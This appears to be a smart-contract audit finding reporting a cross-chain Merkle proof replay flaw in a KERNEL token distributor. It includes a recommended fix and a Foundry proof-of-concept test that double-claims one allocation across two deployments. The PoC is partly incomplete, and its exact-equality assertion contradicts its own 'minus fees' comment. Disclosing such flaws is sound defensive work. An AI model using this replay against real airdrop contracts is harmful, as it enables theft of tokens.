### Title
Cross-Chain Merkle Proof Replay Allows Double-Claiming of KERNEL Tokens - (`contracts/KERNEL/KernelTop100MerkleDistributor.sol`)

### Summary
The leaf encoding in `_verifyClaimProof` omits `chainId` and the contract address. If the same `merkleRoot` is deployed on two chains, a legitimate claimant can replay the identical proof on both chains and receive 2× their allocation.

### Finding Description

The leaf is constructed at line 293 as:

```solidity
bytes32 leaf = keccak256(abi.encodePacked(user, amount));
``` [1](#0-0) 

It encodes only `user` (address) and `amount` (uint256). No `block.chainid`, no `address(this)`, and no nonce are included. The replay guard is the `userClaims` mapping:

```solidity
mapping(address user => UserClaim userClaim) public userClaims;
``` [2](#0-1) 

This mapping is per-contract-instance storage. A claim recorded on chain A (`userClaims[user].amountClaimed += claimableAmount`) has zero effect on the independent storage of the same contract deployed on chain B. The `claim` and `claimAndStake` functions both rely solely on this local state for replay protection: [3](#0-2) [4](#0-3) 

### Impact Explanation

An attacker who is a legitimate claimant with allocation `A` can:
1. Call `claim(A, proof)` on chain A → receives up to `A` KERNEL (minus fee) from chain A's distributor.
2. Call `claim(A, proof)` on chain B → receives up to `A` KERNEL (minus fee) from chain B's distributor.

Total received: up to `2A` KERNEL, against a single merkle-committed entitlement of `A`. This is direct theft of KERNEL tokens held at-rest in the cross-chain deployment, matching the Critical scope target.

### Likelihood Explanation

The preconditions are realistic:
- Deploying the same distributor contract with the same `merkleRoot` on multiple EVM chains (e.g., Ethereum + an L2) is a standard multi-chain airdrop pattern.
- Every EOA automatically controls the same address on all EVM chains, so no additional attacker capability is required.
- The exploit requires only two standard `claim` calls — no privileged access, no front-running, no oracle manipulation.

### Recommendation

Bind the leaf to the specific deployment by including `block.chainid` and `address(this)` in the leaf encoding:

```solidity
bytes32 leaf = keccak256(abi.encodePacked(block.chainid, address(this), user, amount));
```

The off-chain merkle tree generation must be updated to match. This makes each proof valid only on the chain and contract for which it was generated.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

// Fork-safe differential test (Foundry)
// Deploy two distributor instances on two simulated chains with the same merkleRoot.
// Submit the same proof on both. Assert combined payout == 2 * allocation.

contract CrossChainReplayTest is Test {
    KernelTop100MerkleDistributor distributorA;
    KernelTop100MerkleDistributor distributorB;
    MockERC20 kernelA;
    MockERC20 kernelB;

    address attacker = address(0xBEEF);
    uint256 allocation = 1000e18;
    bytes32 merkleRoot;
    bytes32[] proof;

    function setUp() public {
        // Build leaf and tree with only (attacker, allocation) — no chainId
        bytes32 leaf = keccak256(abi.encodePacked(attacker, allocation));
        merkleRoot = leaf; // single-leaf tree: root == leaf, proof is empty

        // Deploy on "chain A" (current fork)
        kernelA = new MockERC20();
        distributorA = new KernelTop100MerkleDistributor();
        distributorA.initialize(address(kernelA), ..., merkleRoot);
        kernelA.mint(address(distributorA), allocation);

        // Simulate "chain B" by deploying a second instance with the same merkleRoot
        kernelB = new MockERC20();
        distributorB = new KernelTop100MerkleDistributor();
        distributorB.initialize(address(kernelB), ..., merkleRoot);
        kernelB.mint(address(distributorB), allocation);
    }

    function testCrossChainReplay() public {
        // Warp past vestingStartTimestamp + VESTING_DURATION to unlock full amount
        vm.warp(vestingStart + 30 days + 1);

        vm.startPrank(attacker);
        distributorA.claim(allocation, proof); // claim on chain A
        distributorB.claim(allocation, proof); // replay identical proof on chain B
        vm.stopPrank();

        uint256 totalReceived = kernelA.balanceOf(attacker) + kernelB.balanceOf(attacker);
        // totalReceived == 2 * allocation (minus fees), proving double-claim
        assertEq(totalReceived, 2 * allocation);
    }
}
```

The test passes on unmodified contract code because `distributorB.userClaims[attacker]` is zero when the replay is submitted — the chain A claim state is invisible to chain B.
